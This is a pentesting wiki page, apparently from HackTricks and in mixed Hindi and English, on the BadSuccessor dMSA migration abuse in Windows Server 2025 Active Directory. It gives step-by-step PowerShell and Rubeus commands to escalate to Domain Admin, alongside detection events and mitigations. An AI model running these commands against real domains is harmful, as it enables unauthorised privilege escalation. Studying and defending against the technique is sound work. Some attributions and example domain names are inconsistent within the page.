# BadSuccessor: Delegated MSA Migration Abuse के माध्यम से Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## अवलोकन

Delegated Managed Service Accounts (**dMSA**), **gMSA** के next-generation successor हैं, जो Windows Server 2025 में उपलब्ध हैं। एक legitimate migration workflow administrators को किसी *old* account (user, computer या service account) को dMSA से replace करने की अनुमति देता है, और permissions को transparently बनाए रखता है। यह workflow `Start-ADServiceAccountMigration` और `Complete-ADServiceAccountMigration` जैसे PowerShell cmdlets के माध्यम से उपलब्ध है और **dMSA object** के दो LDAP attributes पर निर्भर करता है:

* **`msDS-ManagedAccountPrecededByLink`** – superseded (old) account का *DN link*।
* **`msDS-DelegatedMSAState`**       – migration state (`0` = none, `1` = in-progress, `2` = *completed*)।<sup>[[1]](#references)</sup>

यदि कोई attacker किसी OU के अंदर **कोई भी** dMSA create कर सकता है और इन 2 attributes को सीधे manipulate कर सकता है, तो LSASS और KDC dMSA को linked account का *successor* मानेंगे। जब attacker बाद में dMSA के रूप में authenticate करता है, तो उसे **linked account के सभी privileges inherit** हो जाते हैं – यदि Administrator account linked हो, तो **Domain Admin** तक।<sup>[[1]](#references)</sup>

इस technique को Unit 42 ने 2025 में **BadSuccessor** नाम दिया था। बाद में Microsoft ने इसे **CVE-2025-53779** assign किया और **August 2025** में security update जारी किया। यह technique unpatched Windows Server 2025 environments और dangerous OU delegation की reviews के लिए अभी भी relevant है।<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

### Attack prerequisites

1. ऐसा account जिसे *an Organizational Unit (OU)* के अंदर objects create करने की *permission* हो और जिसके पास निम्न में से कम-से-कम एक permission हो:
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** object class
* `Create Child` → **`All Objects`** (generic create)
2. LDAP और Kerberos से network connectivity (standard domain joined scenario / remote attack)।<sup>[[1]](#references)</sup>

## Vulnerable OUs की Enumeration

Unit 42 ने एक PowerShell helper script जारी की है, जो प्रत्येक OU के security descriptors को parse करती है और required ACEs को highlight करती है:<sup>[[1]](#references)</sup>
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
अंदर से script `(objectClass=organizationalUnit)` के लिए paged LDAP search चलाती है और हर `nTSecurityDescriptor` में निम्नलिखित की जाँच करती है:

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (object class *msDS-DelegatedManagedServiceAccount*)

## Exploitation Steps

एक writable OU की पहचान हो जाने के बाद attack केवल 3 LDAP writes दूर है:<sup>[[1]](#references)</sup>
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Replication के बाद attacker सीधे `attacker_dMSA$` के रूप में **logon** कर सकता है या Kerberos TGT का अनुरोध कर सकता है – Windows *superseded* account का token बनाएगा।<sup>[[1]](#references)</sup>

### स्वचालन

कई public PoCs password retrieval और ticket management सहित पूरे workflow को wrap करते हैं:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Detection & Hunting

OUs पर **Object Auditing** enable करें और निम्नलिखित Windows Security Events की निगरानी करें:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – **dMSA** object का निर्माण
* **5136** – **`msDS-ManagedAccountPrecededByLink`** में modification
* **4662** – Specific attribute changes
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – dMSA के लिए TGT issuance

`4662` (attribute modification), `4741` (computer/service account का creation) और `4624` (subsequent logon) को correlate करने पर BadSuccessor activity तुरंत सामने आ जाती है। **XSIAM** जैसे XDR solutions ready-to-use queries के साथ आते हैं (references देखें)।<sup>[[2]](#references)</sup>

## Mitigation

* Microsoft's security update for **CVE-2025-53779** लागू करें और प्रत्येक Windows Server 2025 domain controller का patch level verify करें।<sup>[[6]](#references)</sup>
* **least privilege** के principle को लागू करें – *Service Account* management केवल trusted roles को delegate करें।
* उन OUs से `Create Child` / `msDS-DelegatedManagedServiceAccount` हटाएँ जिन्हें इसकी स्पष्ट आवश्यकता नहीं है।
* ऊपर दिए गए event IDs की निगरानी करें और *non-Tier-0* identities द्वारा dMSAs बनाने या edit करने पर alert करें।

## See also


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: Active Directory में Privilege Escalation के लिए dMSA का दुरुपयोग – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – जब अच्छे Accounts खराब हो जाते हैं: Delegated Managed Service Accounts का Exploitation](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Microsoft Security Response Center – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
